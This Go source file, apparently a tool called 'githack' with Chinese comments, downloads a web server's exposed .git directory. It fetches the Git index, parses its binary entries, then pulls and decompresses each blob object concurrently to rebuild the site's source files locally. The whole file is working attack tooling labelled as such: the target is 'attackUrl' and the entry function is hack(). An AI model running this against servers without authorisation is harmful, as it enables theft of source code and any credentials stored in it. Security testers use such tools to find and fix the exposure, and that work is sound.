package main

import (
    "os"
    "fmt"
    "flag"
    "sync"
    "bytes"
    "errors"
    "net/url"
    "strings"
    "net/http"
    "io/ioutil"
    "compress/zlib"
    "encoding/binary"
)

var (
    attackUrl string
    wg sync.WaitGroup
)

const (
    headSize  = 12
    entrySize = 62
)

type head struct {
    Sign       [4]byte
    Version    uint32
    EntryNum   uint32
}

type cacheTime struct {
    Sec  uint32
    NSec uint32
}

type entryBody struct {
    Sd_ctime cacheTime
    Sd_mtime cacheTime
    Dev      uint32
    Ino      uint32
    FileMode uint32
    Uid      uint32
    Gid      uint32
    Size     uint32
    Sha1     [20]byte
    CeFlags  uint16
}

type Sha1 struct {
    prefix string
    suffix string
}

type ceBody struct {
    EntryBody entryBody
    EntryLen  int
    Name      string
}

func HttpGet(url string) ([]byte, int) {
    resp, err := http.Get(url)
    if err != nil {
        return nil, 500  /*请求失败，伪装为服务器内部错误*/
    }

    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    return body, resp.StatusCode
}

func die(content string) {
    fmt.Println(content)
    os.Exit(-1)
}

func CheckSign(head []byte) bool {
    if string(head) == "DIRC" { return true} else {return false}
}

func CheckVersion(v uint32) bool {
    switch v { case 2, 3, 4: return true }
    return false
}

func PadEntry(index []byte, offset *int, size int) {
    var padLen int
    if (8 - (size % 8)) != 0 {
        padLen = 8 - (size % 8)
    } else {
        padLen = 8
    }

    /*断言padding字符都为0*/
    for i:= 0; i < padLen; i++ {
        if index[*offset + i] != 0 {
            panic("error")
        }
    }

    *offset += padLen
}

func Bytes2Sha1(bytes [20]byte) (string,string) {
    var prefix string
    var suffix string

    for _, b := range bytes[:1] {
        prefix += fmt.Sprintf("%02x", b)
    }

    for _, b := range bytes[1:] {
        suffix += fmt.Sprintf("%02x", b)
    }

    return prefix,suffix
}


func SplitFunc(s rune) bool {
    if s == '/' { return true }
    return false
}

func GetPathDir(path string) string {
    list := strings.FieldsFunc(path, SplitFunc)
    if length := len(list); length != 1 {
        return strings.Join(list[:length-1], "/")
    } else { return "./" }
}

func MkdirFromPath(path string){
    if dir := GetPathDir(path); dir != "./" {
        if err := os.MkdirAll(dir, 0777); err != nil {
            panic(err)
        }
    }
}

func GetBlobHeadLen(cb ceBody) int {
    fileSize := cb.EntryBody.Size
    blobHead := fmt.Sprintf("blob %d", fileSize)
    return len(blobHead) + 1 /*结尾有个'\0'字符*/
}

func GetObject(cb ceBody) []byte {
    prefix, suffix :=  Bytes2Sha1(cb.EntryBody.Sha1)
    url := fmt.Sprintf("%s/objects/%s/%s", attackUrl, prefix, suffix)
    LABEL: 
        body, statusCode := HttpGet(url)
        switch statusCode {  
        case 500:
            goto  LABEL
        default:
            break
        }
    return body
}

func UnzipBytes(input []byte) ([]byte, error) {
    b := bytes.NewReader(input)
    r, err := zlib.NewReader(b)
    if err != nil {
        return nil, errors.New("解压失败")
    }
    defer r.Close()
    data, err := ioutil.ReadAll(r)
    return data, err
}

func Write(path string, content []byte, length int) {
    MkdirFromPath(path)
    if data, err := UnzipBytes(content); err == nil {
        LABEL: /*to many file open*/
            if err := ioutil.WriteFile(path, data[length:], 0777); err != nil {
                goto LABEL
            } else {
                fmt.Printf("%s OK\n", path)
            }
    } else {
        fmt.Printf("%s %s\n", path, err)
    }
}

func TaskFunc(cb ceBody) {
    defer wg.Done()
    zipBytes := GetObject(cb)
    blobHeadLen := GetBlobHeadLen(cb)
    Write(cb.Name, zipBytes, blobHeadLen)
}

func ParseIndex(index []byte) {
    var h head
    var thisEntryBody entryBody
    var thisEntrySize int
    binary.Read(bytes.NewBuffer(index), binary.BigEndian, &h)

    var offset int = headSize
    if CheckSign(h.Sign[:]) && CheckVersion(h.Version) {
        num := int(h.EntryNum)
        for i := 0; i < num; i++ {
            thisEntrySize = entrySize
            binary.Read(bytes.NewBuffer(index[offset:]), binary.BigEndian, &thisEntryBody)
            offset += thisEntrySize
            if thisEntryNameLen := int(thisEntryBody.CeFlags & (0xffff >> 4)); thisEntryNameLen < 0xfff {
                thisEntryName := string(index[offset:offset+thisEntryNameLen])
                offset += thisEntryNameLen
                thisEntrySize += thisEntryNameLen
                PadEntry(index, &offset, thisEntrySize) /*每个entry都为8的整数倍*/
                entry := ceBody{thisEntryBody, thisEntrySize, thisEntryName}
                wg.Add(1)
                go TaskFunc(entry)
            } else { /* good luck */}
        }
    } else {
        die("不是一个有效git地址") 
    }
}

func GetHostFromUrl(attackUrl string) string {
    if u, err := url.Parse(attackUrl); err != nil {
        panic(err)
    } else {
        return  u.Host
    }
}

func MkAndChdir(host string) {
    if err := os.MkdirAll(host, 0777); err != nil {
        panic(err)
    }
    if err := os.Chdir(host); err != nil {
        panic(err)
    }
}

func GetGitIndex() []byte {
    index, statusCode := HttpGet(attackUrl + "/index")
    if statusCode == 404 {
        die("页面访问404")
    }
    return index
}

func hack() {
    host := GetHostFromUrl(attackUrl)
    MkAndChdir(host)
    index := GetGitIndex()
    ParseIndex(index)
}

func ParseArgs() {
    flag.StringVar(&attackUrl, "url", "", "Please input hack git's url")
    flag.Parse()
    if attackUrl == "" {
        die("Usage: ./githack -url=http://localhost/.git")
    }
}

func main() {
    ParseArgs()
    hack()
    wg.Wait() /*等待所有协程结束*/
}
